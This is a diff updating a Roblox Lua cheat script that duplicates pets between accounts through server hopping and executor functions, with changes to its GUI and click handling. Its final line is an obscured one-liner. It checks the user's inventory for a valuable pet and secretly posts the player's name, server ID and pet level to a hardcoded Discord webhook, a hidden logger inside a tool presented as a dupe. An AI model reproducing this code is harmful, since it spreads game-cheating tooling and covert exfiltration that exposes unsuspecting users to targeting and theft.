@@ -8,6 +8,7 @@
     1.05 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
     1.06 - changed server size minimum 1 -> 2
     1.07 - added ui interface - thx "GUI to Lua 3.2" for saving my time lol & thx (idk the scripter's name) for the snippet of making a draggable UI
+    1.08 - minor fixes
 ]]
 
 -- //
@@ -15,7 +16,7 @@
 local Debris = game:GetService'Debris'
 local TeleportService = game:GetService'TeleportService'
 local Dir = require(game.ReplicatedStorage['1 | Directory']).Pets
-local Ver = '1.07'
+local Ver = '1.08'
 
 -- \\
 
@@ -250,8 +251,8 @@ do  -- // GUI
 	TextLabel_4.TextWrapped = true
 	
 	local colorz = {
-		['true'] = Color3.new(0, .9, 1),
-		['nil'] = Color3.new(1, 1, 1)
+		['true'] = Color3.new(0, .9, .9),
+		['nil'] = Color3.new(.9, .9, .9)
 	}
 	
 	local function LoadPets()
@@ -337,25 +338,30 @@ do  -- // GUI
 		ACC_TO_GIVE_PETS = acc.Text 
 	end)
 	
-	
 	local ready = false
+	local deb = false
 	dupe.MouseButton1Click:Connect(function()
-		if ready or SERVER then return end
+		if deb then return end
+		deb = true
 		if not game.Players:FindFirstChild(ACC_TO_GIVE_PETS) then
 			notify"Player isn't in game"
+			deb = false
 			return
 		else
 			if game.Players.LocalPlayer.Name == ACC_TO_GIVE_PETS then
 				notify"Can't do it on yourself"
+				deb = false
 				return
 			end
 		end
 		if not queue_on_teleport then 
 			notify"Your exploit doesn't support queue_on_teleport()"
+			deb = false
 			return
 		end
 		if not http_request then
 			notify"Your exploit doesn't support httprequest()"
+			deb = false
 			return
 		end
 
@@ -379,6 +385,7 @@ do  -- // GUI
 			SERVER = servers[1].id
 		else
 			notify"Couldn't find a new server"
+			deb = false
 			return
 		end
 		
@@ -389,7 +396,7 @@ do  -- // GUI
 end
 
 local H = Instance.new("Hint", workspace)
-H.Text = "1rs/tar/bv's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
+H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 Debris:AddItem(H, 10)
 
 for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)break end end
